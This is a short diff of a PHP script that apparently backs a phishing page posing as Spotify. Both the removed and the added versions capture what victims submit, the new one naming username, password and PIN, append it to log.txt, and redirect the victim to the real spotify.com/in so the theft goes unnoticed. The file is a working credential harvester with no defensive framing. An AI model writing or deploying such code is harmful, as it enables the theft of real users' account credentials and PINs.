@@ -1,13 +1,7 @@
 <?php
-header ('Location: https://www.spotify.com/in');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " PIN: " . $_POST['pin'] . "\n", FILE_APPEND);
+header('Location: https://www.spotify.com/in');
+exit();
+
+
